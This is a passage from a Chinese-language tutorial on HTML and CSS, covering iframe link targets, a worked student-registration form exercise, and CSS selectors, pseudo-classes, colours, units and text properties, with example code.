height=\"800px\"></iframe>\n</html>\n```\nframe1.html\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Document</title>\n</head>\n<body bgcolor=\"aquamarine\">\n   Frame1<br>\n   <!--target的4个参数：_self:自己本身打开打开，_blank:新窗口打开，_parent：父窗口打开，_top：顶级页面打开-->\n   <a href=\"https://jwt1399.top\" target=\"_self\">简简的博客在本身打开</a><br>\n   <a href=\"https://jwt1399.top\" target=\"_blank\">简简的博客在新窗口打开</a><br>\n   <a href=\"https://jwt1399.top\" target=\"_parent\">简简的博客再父窗口打开</a><br>\n   <a href=\"https://jwt1399.top\" target=\"_top\">简简的博客在顶级页面(index页面)打开</a><br>\n</body>\n</html>\n\n```\nframe2.html\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Document</title>\n</head>\n<body bgcolor=\"red\">\n    Frame2\n    <br>\n    <iframe src=\"frame1.html\" frameborder=\"0\" width=\"400px\" height=\"400px\"></iframe>\n</body>\n</html>\n```\nframe3.html\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Document</title>   \n</head>\n<body bgcolor=\"aqua\" >\n    Frame3\n    <br>\n    <iframe src=\"frame2.html\" frameborder=\"0\" width=\"600px\" height=\"600px\"></iframe>\n</body>\n</html>\n```\nindex承载frame3，frame3承载frame2，frame2承载frame1，frame1中放入超链接\n上方示例演示：\n![](https://i.loli.net/2020/03/10/bW4dCcAZzrVERP8.png)\n\n### 参考\n[HTML5 标签含义之元素周期表](http://www.html5star.com/manual/html5label-meaning/)\n[极客学院-HTML](http://wiki.jikexueyuan.com/project/html5/overview.html)\n[菜鸟教程-HTML](https://www.runoob.com/html/html-tutorial.html)\n[W3cSchool-HTML](https://www.w3school.com.cn/html/html_jianjie.asp)\n\n## HTML实例练习\n\n> 相信看完前面部分，你已经掌握了HTML，然而大多数同学可能跟我一样，还是不太熟悉，不能很流畅的使用\n>\n> 下面通过实例来巩固HTML\n\n### 目的\n\n- 掌握常用的HTML文本、超链接和图像标签的使用；\n\n- 掌握HTML表格标签，能够使用表格进行简单的网页布局设计；\n\n- 掌握HTML表单应用，包括HTML5新增的输入域类型和属性的使用。\n\n### 题目\n\n**请按要求设计一个学生信息注册网页，可以使用表格布局，页面内容居中显示，如图1所示，主要要求如下：**\n\n> (1)\t设置页面标题为“新生报到”；\n> (2)\t使用h3标签居中显示“注册信息”，并设置一个页面顶部锚点；\n> (3)\t在注册信息填写区域前后设置水平分隔线；\n> (4)\t表单使用get提交方式，表单中所有输入域必须设置name属性，设置表单的自动完成功能；\n> (5)\t设置用户名、学号和密码为必填项，在输入域后显示红色“*”号，设置用户名输入框默认获得焦点，密码输入框中 提示用户“请输入6位密码”；\n> (6)\t除用户名、学号、密码、单选按钮、复选框、列表框和文本区之外，其它input元素必须为HTML5新增的输入类型；\n> (7)\t性别默认选择“女”，借助label标签使得用户可以通过单选按钮后的文本进行勾选；\n> (8)\t身高最大,最小,步长和默认值分别为190,150,5,175厘米；体重最大,最小,步长和默认值分别为90,45,2,55千克；\n> (9)\t电话号码输入框中提示“请输入11位”数字，并设置pattern属性进行校验；\n> (10)\t家庭住址下拉列表中依此设置“北京、上海、成都”三个选项，默认选择“成都”；\n> (11)\t复选框中默认选择足球；\n> (12)\t使用datalist标签为“喜欢的网站”输入框提供可选网址列表，如图2所示；x\n> (13)\t邮政编码输入框中提示“请输入6位邮政编码”，并设置pattern属性进行校验；x\n> (14)\t上传2张生活照；\n> (15)\t个人自述文本区设置行数为5行，列数为50，默认显示文本“我是一位特别热爱学习的好孩子。。。”\n> (16)\t插入一个隐藏域，设置value值为你的幸运数字；\n> (17)\t设置“注册”和“重置”两个按钮，居中显示；\n> (18)\t在页面底部插入“电话”、“短信”、“E-Mail”和“返回顶部”4个导航链接，前三个导航链接必须使用相应的超链接伪协议，“返回顶部”链接到页面顶部锚点。另外，需设置链接状态样式，链接字体为蓝色，已访问过为灰色，鼠标经过是为红色，鼠标按下时为黄色。\n\n| 效果图     | ![图一](https://img.jwt1399.top//img/20200810113802.jpg) |\n| ---------- | -------------------------------------------------------- |\n| **效果图** | ![图二](https://img.jwt1399.top//img/20200810113809.jpg) |\n\n### 解答\n\n**具体每步答案，请对应看注释**\n\n```html\n<!doctype html>\n<html>\n\t<head>\n\t<meta charset=\"utf-8\">\n\t<!--<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, user-scalable=no\">-->\n\t<title>新生报到</title><!--题目1-->\n\t<style> /*题目18*/\n\t\ta {text-decoration: none;}\t/*定义标准的文本*/\n        a:link {color: blue;}\t/*点击前蓝色*/\n        a:visited {color: gray;}\t/*访问后灰色*/\n        a:hover {color: red;}\t/*鼠标经过是红色*/\n        a:active {color: yellow;}\t/*鼠标按下时黄色*/\n\t</style>\n\t</head>\n\t<body>\n\t\t<h3 id=\"title\" align=\"center\">注 册 信 息</h3><!--题目2-->\n\t\t<hr noshade size=\"1\" width=\"80%\"><!--题目3-->\n\t\t<form action=\"\" id=\"form1\" autocomplete=\"on\" method=\"get\"><!--题目4-->\n\t\t\t<table  width=\"80%\" border=\"0\" align=\"center\" cellspacing=\"0\">\t\t\t\t\n\t\t\t\t<tr> <!--题目5-->\n\t\t\t\t\t<td width=\"30%\" align=\"right\">姓名：</td>\n\t\t\t\t\t<td width=\"5%\"></td> \n\t\t\t\t\t<td align=\"left\"><input type=\"text\"  name=\"user_name\" maxlength=\"10\" autofocus required/><font color=\"#FF0000\"> *</font></td>\n\t\t\t\t</tr>\n\t\t\t\t\n\t\t\t\t<tr> <!--题目5-->\n\t\t\t\t\t<td width=\"30%\" align=\"right\">学号：</td> \n\t\t\t\t\t<td></td> \n\t\t\t\t\t<td align=\"left\"><input type=\"text\"  name=\"user_id\" required/><font color=\"#FF0000\"> *</font></td>\n\t\t\t\t</tr>\n\t\t\t\t\n\t\t\t\t<tr> <!--题目5--> \n\t\t\t\t\t<td width=\"30%\" align=\"right\">密码：</td> \n\t\t\t\t\t<td></td> \n\t\t\t\t\t<td align=\"left\"><input type=\"password\"  name=\"user_paw\"  placeholder=\"请输入8位密码\" required /><font color=\"#FF0000\"> *</font></td>\n\t\t\t\t</tr>\n\t\t\t\t<tr> <!--题目7-->\n\t\t\t\t\t<td width=\"30%\" align=\"right\">性别：</td> \n\t\t\t\t\t<td></td> \n\t\t\t\t\t<td align=\"left\">\n                    <input type=\"radio\" id=\"male\" name=\"user_sex\" value=\"man\"/>  \n                    <label for=\"male\">男</label>\n\t\t\t\t\t<input type=\"radio\" id=\"female\"  name=\"user_sex\" value=\"woman\" checked/>\n                    <label for=\"female\">女</label></td>\n\t\t\t\t</tr>\n\t\t\t\t<tr> <!--题目8-->\n\t\t\t\t\t<td width=\"30%\" align=\"right\">身高：</td> \n\t\t\t\t\t<td></td> \n\t\t\t\t\t<td align=\"left\"><input type=\"number\"  name=\"user_height\" min=\"150\" max=\"190\" value=\"175\" step=\"5\" />厘米</td>\n\t\t\t\t</tr>\n\t\t\t\t<tr> <!--题目8-->\n\t\t\t\t\t<td width=\"30%\" align=\"right\">体重：</td> \n\t\t\t\t\t<td></td> \n\t\t\t\t\t<td align=\"left\"><input type=\"range\"  name=\"user_weight\" min=\"45\" max=\"90\" value=\"55\" step=\"2\" />千克</td>\n\t\t\t\t</tr>\n\t\t\t\t\n\t\t\t\t<tr> \n\t\t\t\t\t<td width=\"30%\" align=\"right\">出生日期：</td> \n\t\t\t\t\t<td></td> \n\t\t\t\t\t<td align=\"left\"><input type=\"date\"  name=\"user_birthday\"/></td>\n\t\t\t\t</tr>\n\t\t\t\t\n\t\t\t\t<tr> <!--题目9-->\n\t\t\t\t\t<td width=\"30%\" align=\"right\">电话号码：</td> \n\t\t\t\t\t<td></td> \n\t\t\t\t\t<td align=\"left\"><input type=\"tel\"  name=\"user_tel\" pattern=\"\\d{11}\" placeholder=\"请输入11手机号码\"/></td>\n\t\t\t\t</tr>\n\t\t\t\t\n\t\t\t\t<tr> \n\t\t\t\t\t<td width=\"30%\" align=\"right\">E-mail：</td> \n\t\t\t\t\t<td></td> \n\t\t\t\t\t<td align=\"left\"><input type=\"email\"  name=\"user_email\"/></td>\n\t\t\t\t</tr>\n\t\t\t\t\n\t\t\t\t<tr> \n\t\t\t\t\t<td width=\"30%\" align=\"right\">个人主页：</td> \n\t\t\t\t\t<td></td> \n\t\t\t\t\t<td align=\"left\"><input type=\"url\"  name=\"user_homepage\" autocomplete=\"off\"/></td>\n\t\t\t\t</tr>\n\t\t\t\t\n\t\t\t\t<tr> <!--题目10-->\n\t\t\t\t\t<td width=\"30%\" align=\"right\">家庭住址：</td> \n\t\t\t\t\t<td></td> \n\t\t\t\t\t<td align=\"left\"><select name=\"user_address\" >\n\t\t\t\t\t<option value=\"0\" >北京</option>\n\t\t\t\t\t<option value=\"1\" >上海</option>\n\t\t\t\t\t<option value=\"2\" selected>成都</option>\n\t\t\t\t</select></td>\n\t\t\t\t</tr>\n\t\t\t\t\n\t\t\t\t<tr> <!--题目13-->\n\t\t\t\t\t<td width=\"30%\" align=\"right\">邮政编码：</td>\n\t\t\t\t\t<td></td>  \n\t\t\t\t\t<td align=\"left\"><input type=\"text\"  name=\"user_zipcode\" pattern=\"[0-9]{6}\" placeholder=\"请输入6位邮政编码\" /></td>\n\t\t\t\t</tr>\n\t\t\t\t\n\t\t\t\t<tr> \n\t\t\t\t\t<td width=\"30%\" align=\"right\">喜欢的颜色：</td> \n\t\t\t\t\t<td></td> \n\t\t\t\t\t<td align=\"left\"><input type=\"color\"  name=\"user_color\"/></td>\n\t\t\t\t</tr>\n\t\t\t\t\n\t\t\t\t<tr> <!--题目11-->\n\t\t\t\t\t<td width=\"30%\" align=\"right\">喜欢的运动：</td> \n\t\t\t\t\t<td></td> \n\t\t\t\t\t<td align=\"left\"><input type=\"checkbox\" name=\"user_habit1\" value=\"basketball\"/>篮球\n\t\t\t<input type=\"checkbox\" name=\"user_habit2\" value=\"football\" checked>足球\n\t\t\t<input type=\"checkbox\" name=\"user_habit3\" value=\"swimming\">游泳 </td>\n\t\t\t\t</tr>\n\t\t\t\t\n\t\t\t\t<tr> <!--题目12-->\n\t\t\t\t\t<td width=\"30%\" align=\"right\">喜欢的网站：</td> \n\t\t\t\t\t<td></td> \n\t\t\t\t\t<td align=\"left\"><input type=\"url\" name=\"user_favurl\" list=\"urllist\"/>\n\t\t\t<datalist id=\"urllist\" >\n\t\t\t\t\t<option label=\"百度\" value=\"http://www.baidu.com\"/>\n\t\t\t\t\t<option label=\"新浪\" value=\"http://www.sina.com\"/>\n\t\t\t\t\t<option label=\"谷歌\" value=\"http://www.google.com\"/>\n\t\t\t\t\t<option value=\"http://www.163.com\">网易</option>\n\t\t\t</datalist></td>\n\t\t\t\t</tr>\n\t\t\t\t\n\t\t\t\t<tr> <!--题目14-->\n\t\t\t\t\t<td width=\"30%\" align=\"right\">生活照2张：</td> \n\t\t\t\t\t<td></td> \n\t\t\t\t\t<td align=\"left\"><input type=\"file\"  name=\"user_album\"  multiple/></td>\n\t\t\t\t</tr>\n\t\t\t\t\n\t\t\t\t<tr> <!--题目15-->\n\t\t\t\t\t<td width=\"30%\" align=\"right\" valign=\"top\">个人自述：</td> \n\t\t\t\t\t<td></td> \n\t\t\t\t\t<td align=\"left\"><textarea name=\"info\" rows=\"5\" cols=\"50\">我是一位特别热爱学习的好孩子。。。</textarea></td>\n\t\t\t\t</tr>\n\t\t\t\t\n\t\t\t\t<tr> \n\t\t\t\t\t<td width=\"30%\" align=\"center\" colspan=\"3\">\n\t\t\t\t\t<input type=\"hidden\" name=\"user_secret\" value=\"7\"/><!--题目16-->\n\t\t\t\t\t<pre><input type=\"submit\" value=\"注册\"/>               <input type=\"reset\" value=\"重置\" /></pre><!--题目17-->\n\t\t\t</td> \n\t\t\t\t</tr>\n\t\t\t\t\n\t\t\t\t<tr><!--题目3-->\n\t\t\t\t\t<td colspan=\"3\"><hr noshade size=\"1\" width=\"100%\"></td>\n\t\t\t\t</tr>\n\t\t\t\n\t\t\t\t<tr> \n\t\t\t\t\t<td colspan=\"3\">\n\t\t\t\t\t\t<table width=\"100%\"><!--题目18-->\n\t\t\t\t\t\t\t<tr align=\"center\">\n\t\t\t\t\t\t\t\t<td width=\"25%\"><a href=\"tel:10086\">电话</a></td>\n\t\t\t\t\t\t\t\t<td width=\"25%\"><a href=\"sms:10086\">短信</a></td>\n\t\t\t\t\t\t\t\t<td width=\"25%\"><a href=\"mailto:10086@sina.com\">E-mail</a></td>\n\t\t\t\t\t\t\t\t<td width=\"25%\"><a href=\"#title\">返回顶部</a></td>\n\t\t\t\t\t\t\t</tr>\n\t\t\t\t\t\t</table>\n\t\t\t\t\t</td> \t\n\t\t\t\t</tr>\n\t\t\t\t\n\t\t\t</table>\n\t</form>\n\t\t\t\n</body>\n</html>\n```\n\n## CSS\n\n>CSS 指层叠样式表 (Cascading Style Sheets),定义如何显示 HTML 元素\n\n### 1 基础\n\nCSS 规则由两个主要的部分构成：选择器，以及一条或多条声明。\n```html\nselector {declaration1; declaration2; ... declarationN }\n```\n选择器通常是您需要改变样式的`HTML`元素。\n每条声明由一个属性和一个值组成。\n\n下面这行代码的作用是将`h1`元素内的文字颜色定义为红色，同时将字体大小设置为 14 像素。\n![](https://i.loli.net/2019/08/14/GwTfQ8bJ4e67vSW.png)\nHTML引入CSS\n\n外部(链接)样式：(放在head中)\n\n```html\n<link rel=\"stylesheet\" type=\"text/css\" href=\"xxx.css\">\n```\nxxx.css\n```css\np{\n    color:red;\n }\n```\n内嵌样式：(放在head中)\n```css\n<style type=\"text/css\">\np{\n    color:red;\n}\n</style>\n```\n\n行内样式：\n\n```html\n<p style=\"color:red;\"></p>\n```\n\n导入样式：\n\n```css\n<style>\n\t\t@import url(\"style/mystyle.css\");\n</style>\n```\n\n> 导入样式与链接样式的区别：\n>\n> 导入样式在HTML文件初始化时被导入到文件中，作为文件的一部分；链接样式是在HTML标记需要样式风格时才以链接方式引入。显然，链接样式可加快页面的初始化。\n\n优先级：行内样式》》内嵌样式》》链接样式》》导入样式\n\n### 2 继承及其问题\n\n根据 CSS，子元素从父元素继承属性。但是它并不总是按此方式工作。看看下面这条规则：\n\n```css\nbody {\n     color:red;\n     }\n```\n通过 CSS 继承，子元素将继承最高级元素（在本例中是 body）所拥有的属性（这些子元素诸如 p, td, ul, ol, ul, li, dl, dt,和 dd）。不需要另外的规则，所有 body 的子元素都应该显示红色，子元素的子元素也一样。\n\n如果你不希望`\"color:red\"`被所有的子元素继承，比方说，你希望段落颜色是`green`。重新创建一个针对`p`的特殊规则，这样它就会摆脱父元素的规则：\n```css\nbody  {\n    color:red;\n     }\n\np  {\n     color:green;\n     }\n```\n### 3 CSS的层叠性\n\n一个元素被同一选择器多次定义，或被多个类选择器选中时，**采用最后被定义的样式**\n\n```css\n实例：  h1{color: red;}\n\t   h1{color: blue;} #采用最后被定义的样式\n\n\n实例：\t.purple{color: purple;}\n\t  .red{color: red;}\n\t <p class=\"purple red\">类选择器</p> #采用最后被定义的样式\n\n```\n\n当同一元素被不同选择器选中时，一般的采用就近原则\n\n优先级关系：ID选择器》类选择器》标签选择器\n\n```html\n<!DOCTYPE html >\n<head>\n<title>层叠特性</title>\n<style type=\"text/css\">\n\tp{color:black;}\n\t.red{color:red;}\n\t.purple {color:purple;}\n\t#p1{color:blue;}\n</style>\n</head>\n<body>\n\t<p >这是第1行文本</p>\n\t<p class=\"red\">这是第2行文本</p> <!--类选择器优先与标签选择器-->\n\t<p id=\"p1\" class=\"red\">这是第3行文本</p><!--id选择器优先-->\n\t<p style=\"color:green;\" id=\"p1\">这是第4行文本</p><!--行内样式优先-->\n\t<p class=\"purple red\">这是第5行文本</p> <!--采用最后被定义的样式purple-->\n</body>\n</html>\n```\n\n![](https://i.loli.net/2020/03/31/KxzA8aHUtEOnoSw.png)\n\n### 4 选择器\n\n| **类型**   | **基本语法**                | **说明**                     |\n| ---------- | --------------------------- | ---------------------------- |\n| 标签选择器 | body{property:  value}      | 适用于标签中的所有元素       |\n| ID选择器   | #id{property: value}        | 针对特定（一个）元素         |\n| 类选择器   | **.**class{property: value} | 为一系列元素定义相同样式     |\n| 全局选择器 | *{property: value}          | 表示对所有元素起作用         |\n| 属性选择器 | [title] { property: value } | 对带有指定属性的元素设置样式 |\n\n#### 标签选择器\n\n> 适用于标签中的所有元素\n\n```css\nbody {font-style: italic;}\n```\n\n#### 4.1 id选择器\n\n> 可以为标有特定 id 的 HTML 元素指定特定的样式。\n\nid 选择器以 \"#\" 来定义。\n下面的两个 id 选择器，第一个可以定义元素的颜色为红色，第二个定义元素的颜色为绿色：\n\n```css\n#a {color:red;}\n#b {color:green;}\n```\n下面的 HTML 代码中，id 属性为 a 的 p 元素显示为红色，而 id 属性为 b 的 p 元素显示为绿色。\n```css\n<p id=\"a\">这个段落是红色。</p>\n<p id=\"b\">这个段落是绿色。</p>\n```\n#### 4.2 类选择器\n\n> 为一系列元素定义相同样式\n\n在 CSS 中，类选择器以一个点号显示：\n```\n.A {text-align: center}\n```\n所有拥有 A 类的 HTML 元素均为居中。\n\n在下面的 HTML 代码中，h1 和 p 元素都有 A 类。这意味着两者都将遵守 \".A\" 选择器中的规则。\n```html\n<h1 class=\"A\">\nThis heading will be center-aligned\n</h1>\n\n<p class=\"A\">\nThis paragraph will also be center-aligned.\n</p>\n```\n#### 4.3 全局选择器\n\n> 对所有元素起作用\n\n```css\n*{\n  color:red;\n  font-size:30px\n}\n```\n\n#### 4.4 属性选择器\n\n> 对带有指定属性的 HTML 元素设置样式。\n\n下面的例子为带有`title`属性的所有元素设置样式：\n```css\n[title]\n{\ncolor:red;\n}\n```\n\n>属性和值选择器:对带有指定属性和值的 HTML 元素设置样式。\n\n下面的例子为`title=\"jwt\"`的所有元素设置样式：\n```css\n[title=jwt]\n{\nborder:5px solid blue;\n}\n```\n示例演示：\n![](https://i.loli.net/2019/08/14/tOD7wU9nfNqpiP8.png)\n![](https://i.loli.net/2019/08/14/QoO1km5aILBvGwX.png)\n\n### 5 复合选择器\n\n| **类型**       | **基本语法**                      | **说明**                                     |\n| -------------- | --------------------------------- | -------------------------------------------- |\n| **并集选择器** | **E1,  E2, E3 {property: value}** | **多个选择器使用相同样式**                   |\n| **交集选择器** | **E.myclass**     **E#myid**      | **选择类名为my class或 id 为 myid 的 E元素** |\n| **包含选择器** | **E  F**                          | **选择所有被E元素包含的F元素。**             |\n| **子选择器**   | **E>F**                           | **选择所有作为E元素的子元素 F。**            |\n| **相邻选择器** | **E+F**                           | **选择紧贴在E元素之后F元素。**               |\n| **兄弟选择器** | **E**~**F**                       | **选择E元素后的所有兄弟元素F。**             |\n\n#### 5.1 并集选择器\n\n> 多个选择器使用相同样式\n\n```css\nh1,h2,h3,p {\n  color: green;\n  }\n```\n\n所有的`h1-h3标题,段落`,元素都是绿色的。\n\n#### 5.2 交集选择器\n\n> 选择类名为class或id为myid 的E元素\n\n```css\nhr#hr1{height:13px;}\np.p1{color:blue;} \n```\n选择水平分割线id为hr1的高度为13px，选择段落类名为p1的颜色为蓝色\n```css\n<hr id=\"hr1\">\n<p class=\"p1\">李白</p>   \n<p class=\"p1 p2\">李白</p> \n<hr id=\"hr2\">  \n```\n\n> **一个元素只能有一个唯一的ID，但可以属于多个类**\n\n#### 5.3 包含选择器\n\n> E F: 选择所有被E元素包含的F元素。\n\n```css\n<style type=\"text/css\">\n\th1{color:red;}\n\th1 strong{\n\t\tcolor:blue; \n\t    font-size:40px;\n\t}\n</style>\n\n```\n上方选择了被h1包含的所有strong元素变为蓝色\n```html\n<body>\n\t<h1>测试CSS的<strong>包含</strong>效果</h1>\n    <h1>测试<span>CSS的<strong>包含</strong>效果</span></h1>\n\t<h2>此处使用<strong>包含选择器</strong>了么？</h2>\n</body>\n\n```\n\n![](https://i.loli.net/2020/03/25/Dtkuw5M4oxVEHrh.png)\n\n#### 5.4 子选择器\n\n>E>F: 选择所有作为E元素的子元素 F,孙子不选\n\n```css\n<style type=\"text/css\">\n\th1{color:red;}\n\th1>strong{\n\t\tcolor:blue; \n\t    font-size:40px;\n\t}\n</style>\n\n```\n上方选择了被h1包含的儿子strong元素变为蓝色\n```html\n<body>\n\t<h1>测试CSS的<strong>包含</strong>效果</h1>\n\t<h1>测试<span>CSS的<strong>包含</strong>效果</span></h1>\n\t<h2>此处使用<strong>包含选择器</strong>了么？</h2>\n</body>\n```\n\n![](https://i.loli.net/2020/04/07/DOqT35cFpHWUEQ6.png)\n\n> 包含选择器与子选择器的区别：包含选择器包括子子孙孙F元素，而子选择器只选择子代F元素，而忽略孙辈元素。\n\n#### 5.5 相邻选择器\n\n> E+F: 选择紧贴在E元素之后F元素。\n\n```css\n<style type=\"text/css\">\n\tdiv + p {background-color:#00FF00;}/*相邻选择器*/\n</style>\n```\n\n上方选择了div元素之后的紧邻p元素背景颜色变为绿色\n\n```html\n<div style=\"width:733px; border: 1px solid #666; padding:5px;\">\n\t<div>\n\t\t<p>匹配E元素之后的F元素</p>\n\t</div>\n\t<p>匹配E元素之后的F元素</p>\n\t<p>匹配E元素之后的F元素</p>\n\t<hr />\n\t<div>匹配E元素之后的F元素</div>\n\t<hr />\n\t<p>匹配E元素之后的F元素</p>\n</div>\n\n```\n\n![](https://i.loli.net/2020/03/25/weEVHrQ4Pldapmt.png)\n\n#### 5.6 兄弟选择器\n\n> E~F:  选择E元素后的所有兄弟元素F。\n\n```css\n<style type=\"text/css\">\n\tdiv ~ p {background-color:#00FF00;}/*兄弟选择器*/\n</style>\n```\n\n上方选择了div元素之后的所有兄弟p元素背景颜色变为绿色\n\n```html\n<div style=\"width:733px; border: 1px solid #666; padding:5px;\">\n\t<div>\n\t\t<p>匹配E元素之后的F元素</p>\n\t</div>\n\t<p>匹配E元素之后的F元素</p>\n\t<p>匹配E元素之后的F元素</p>\n\t<hr />\n\t<div>匹配E元素之后的F元素</div>\n\t<hr />\n\t<p>匹配E元素之后的F元素</p>\n</div>\n```\n\n![](https://i.loli.net/2020/03/25/rXjR2inwGpysJKU.png)\n\n### 6 元素状态选择器\n\n> 指定样式只有当元素处于某种状态时才起作用。\n\n| **选择器** | **说明**                                                    |\n| ---------- | ----------------------------------------------------------- |\n| E:link     | 设置超链接a在未被访问前的样式。                             |\n| E:visited  | 设置超链接a在其链接地址已被访问过时的样式。                 |\n| E:hover    | 设置元素在其鼠标悬停时的样式。                              |\n| E:active   | 设置元素在被用户激活（点击与释放之间）时的样式。            |\n| E:focus    | 设置元素在成为输入焦点（该元素的onfocus事件发生）时的样式。 |\n| E:checked  | 处于选中状态的元素E                                         |\n| E:enabled  | 处于可用状态的元素E                                         |\n| E:disabled | 处于禁用状态的元素E                                         |\n\n#### 6.1 超链接状态选择器\n\n```html\n\t<head>\n\t\t<title>连接状态选择器</title>\n\t\t<style>\n\t\t\ta:link {color: red}\t\t    /* 未访问的链接 */\n\t\t\ta:visited {color: green}\t/* 已访问的链接 */\n\t\t\ta:hover {color:blue}\t /* 鼠标移动到链接上*/\n\t\t\ta:active {color: orange}\t/* 选定的链接 */\n\t\t</style>\n\t</head>\n\t<body>\n\t\t<a href=\"http://www.sohu.com\">搜狐</a>\n\t</body>\n\n```\n\n| 未访问的链接                                           | 已访问的链接                                           | 鼠标移动到链接上                                       | 选定的链接                                             |\n| ------------------------------------------------------ | ------------------------------------------------------ | ------------------------------------------------------ | ------------------------------------------------------ |\n| ![](https://i.loli.net/2020/03/25/D1ZBdfyG5WlgTKA.png) | ![](https://i.loli.net/2020/03/25/2LiXqgUslWMzGHv.png) | ![](https://i.loli.net/2020/03/25/sUZ6ET3djHwAVmr.png) | ![](https://i.loli.net/2020/03/25/cAsS7pD8BqCagmo.png) |\n\n#### 6.2 UI元素状态伪类选择器\n\n```html\n<head>\n<title>UI元素状态选择器</title>\n<style>\n\tinput:hover {   background:red;    }\n\tinput:focus {   background:blue;    }\n\tinput:active {   background:green;    }\n\t/*focus规则放在active规则之后会覆盖active样式*/\n\t/*input:focus {   background:yellow;    }*/\n\tinput:disabled {    background:pink;     }\n\tinput:checked+span{background-color:#00f}\n</style>\n</head>\n\n<body>\n<center>\n\t<h3 align=center>用户登录</h3>\n\t<form method=\"post\" action=\"\">\n\t用户名：<input type=text name=name><br>\n\t密&nbsp;&nbsp;&nbsp;&nbsp;码：<input type=password name=pass disabled=\"disabled\"><br>\n\t性&nbsp;&nbsp;&nbsp;&nbsp;别：<input type=\"radio\" name=\"sex\" value=\"1\"/><span>男</span>\n\t<input type=\"radio\" name=\"sex\" value=\"0\" /><span>女</span><br>\n\t<input type=submit value=提交>\n\t<input type=reset value=重置>\n\t</form>\n<center>\n</body>\n```\n\n![](https://i.loli.net/2020/03/25/mXTACUyDx618a4j.gif)\n\n参考：[css3 - UI元素状态伪类选择器](https://blog.csdn.net/erdouzhang/article/details/70846721)\n\n### 7 伪对象选择器\n\n| **选择器**     | **说明**                                                     |\n| -------------- | ------------------------------------------------------------ |\n| E:first-letter | 设置对象内的第一个字符的样式。                               |\n| E:first-line   | 设置对象内的第一行的样式。                                   |\n| E::selection   | 设置对象被选择时的颜色。                                     |\n| E:before       | 设置在对象前（依据对象树的逻辑结构）发生的内容。用来和content属性一起使用 |\n| E:after        | 设置在对象后（依据对象树的逻辑结构）发生的内容。用来和content属性一起使用 |\n\n```html\n<head>\n<style>\n\tp:first-line{color:red}\n\tp::first-letter{color:green;font-size:25px}\n\tspan::selection{background:#F0F}\n    a:before{content:url(images/rar.jpg)}\n\ta:after {content:\"唐诗三百首\"; font-style:italic; color:#f00}\t\n</style>\n</head>\n<body>\n\t<p>\n\t    春晓-孟浩然<br />\n\t    春眠不觉晓，<br />\n\t    处处闻啼鸟，<br />\n\t    夜来风雨声，<br />\n\t    花落知多少。<br />\n\t</p>\n\t<hr />\n\t<span>这首诗是唐代诗人孟浩然的作品。孟浩然早年隐居鹿门山...</span>\n    <hr />\n    <a href=\"#\">点此下载</a>\n</body>\n```\n\n![](https://i.loli.net/2020/03/25/yKgEslevx9R2ZU5.png)\n\n### 8 否定伪类选择器\n\n> E:not(s) 否定伪类选择器，匹配不含有s选择符的元素E。    \n\n```html\n<head>\n<style>\n     p:not(.abc){color:#f00;}\n</style>\n</head>\n<body>\n    <p class=\"abc\">否定伪类选择符 E:not()</p>\n    <p id=\"abc\">否定伪类选择符 E:not()</p>\n    <p class=\"abcd\">否定伪类选择符 E:not()</p>\n    <p>否定伪类选择符 E:not()</p>\n</body>\n```\n\n![](https://i.loli.net/2020/03/31/nUbkH1qlLsOij8Z.png)\n\n\n\n### 9 目标伪类选择器\n\n> E:target 目标伪类选择器，选择匹配E同时被URL指向的元素。\n\n```html\n<!doctype html>\n<html>\n<head>\n<meta charset=\"utf-8\">\n<style type=\"text/css\">\ndiv:target{\n\tbackground-color:#FF0; \n\tfont-weight:bold;\n\tline-height:24px; } \np{ height:50px;}\n</style>\n<title>目标伪类 E:target 测试</title>\n</head>\n<body>\n\t<div id=\"nav-primary\">#nav-primary</div> \n\t<div id=\"content-primary\">#content-primary</div> \n\t<div id=\"content-secondary\">#content-secondary</div> \n\t<p>单击如下链接：</p>\n\t<a href=\"#nav-primary\">去nav-primary</a>\n\t<a href=\"#content-primary\" target=\"_self\">去content-primary</a>\n\t<a href=\"#content-secondary\" target=\"new\">去content-secondary</a>\n\t<p>提示：也可以在地址栏的url后面输入#content-secondary，可以看到#content-primary的div出现黄色背景</p>\n</body>\n</html>\n```\n\n![](https://i.loli.net/2020/03/31/rjQslEZdPCzGVoA.png)\n\n### 10 颜色\n\n| 单位            | 描述                                       |\n| :-------------- | :----------------------------------------- |\n| (颜色名)        | 颜色名称 (比如 red)                        |\n| rgb(x,x,x)      | RGB 值 (比如 rgb(255,0,0))                 |\n| rgba(x,x,x,x)   | rgba(255,0,0,0.3) 最后一个参数为颜色透明度 |\n| rgb(x%, x%, x%) | RGB 百分比值 (比如 rgb(100%,0%,0%))        |\n| #rrggbb         | 十六进制数 (比如 #ff0000)                  |\n| hsl(h,s,l)      | h:色调 s:饱和度 l:亮度 hsl(360,50%,50%)    |\n| hsla(h,s,l,a)   | a:透明度 0-1 hsla(360,50%,50%,0.1)         |\n\n### 11 单位\n\n| 单位 | 描述                                                         |\n| :--- | :----------------------------------------------------------- |\n| %    | 百分比                                                       |\n| in   | 英寸                                                         |\n| cm   | 厘米                                                         |\n| mm   | 毫米                                                         |\n| em   | 1em 等于当前的字体尺寸。2em 等于当前字体尺寸的两倍。例如，如果某元素以 12pt 显示，那么 2em 是24pt。在 CSS 中，em 是非常有用的单位，因为它可以自动适应用户所使用的字体。 |\n| ex   | 一个 ex 是一个字体的 x-height。 (x-height 通常是字体尺寸的一半。) |\n| pt   | 磅 (1 pt 等于 1/72 英寸)                                     |\n| pc   | 12 点活字 (1 pc 等于 12 点)                                  |\n| px   | 像素 (计算机屏幕上的一个点)                                  |\n\n### 12 字体\n\n字体属性\n![](https://i.loli.net/2019/08/17/Ob4ACFglondUQKJ.png)\n\n### 13 文本\n\n文本属性\n\n| 属性                | 描述                                                    |\n| :------------------ | :------------------------------------------------------ |\n| **color**           | **设置文本颜色**                                        |\n| **direction**       | **设置文本方向。**                                      |\n| **line-height**     | **设置行高。**                                          |\n| **letter-spacing**  | **设置字符间距。**                                      |\n| **text-align**      | **对齐元素中的文本。**                                  |\n| **vertical-align**  | **设置对象内容的垂直对齐方式**                          |\n| **text-decoration** | **向文本添加修饰。**                                    |\n| **text-indent**     | **缩进元素中文本的首行。**                              |\n| **text-shadow**     | **设置文本阴影及模糊效果。**                            |\n| **text-transform**  | 